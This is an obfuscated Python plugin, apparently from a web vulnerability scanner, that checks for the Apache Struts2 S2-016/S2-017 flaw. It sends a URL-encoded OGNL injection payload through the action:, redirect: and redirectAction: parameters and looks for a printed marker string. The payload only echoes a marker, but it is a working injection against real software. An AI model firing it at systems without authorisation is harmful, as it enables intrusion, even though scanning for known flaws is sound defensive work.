#Embedded file name: struts_016_017.py
import urlparse
import time
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''www''':
        OO0o = urlparse.urlparse(arg)
        if OO0o.path.endswith('''.action''') or OO0o.path.endswith('''.do'''):
            return (True, decode("\x0c\xc3'\x14'b\x99~\xa4") % (OO0o.scheme, OO0o.netloc, OO0o.path))
    elif service == '''struts''':
        return (True, arg)


def audit(arg):
    Oo0Ooo = '''${%23res%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27),%23res.getWriter().print(%22\100\167\145\142\163\141\146\145\163\143\141\156\100%22),%23res.getWriter().flush(),%23res.getWriter().close()}'''
    O0O0OO0O0O0 = '''@websafescan@'''
    for iiiii in ['''action''', '''redirect''', '''redirectAction''']:
        ooo0OO, II1, O00ooooo00, I1IiiI, IIi1IiiiI1Ii = curl.curl2('''%s?stamp=%s&%s:%s''' % (arg,
         str(time.time()),
         iiiii,
         Oo0Ooo))
        if O00ooooo00 and O00ooooo00.find(O0O0OO0O0O0) != -1:
            security_hole(arg)
            break
            if 0:
                O0 - ooOO00oOo % oOo0O0Ooo * Ooo00oOo00o.oOoO0oo0OOOo + iiiiIi11i


if __name__ == '__main__':
    from dummy import *
    if 0:
        II11iiII / OoOO0ooOOoo0O + o0000oOoOoO0o * i1I1ii1II1iII % oooO0oo0oOOOO

#KEY---38ad0c291a56f74acaee1019f24f188a7ddbb6cc51d7e4c29fa993b568404fd1---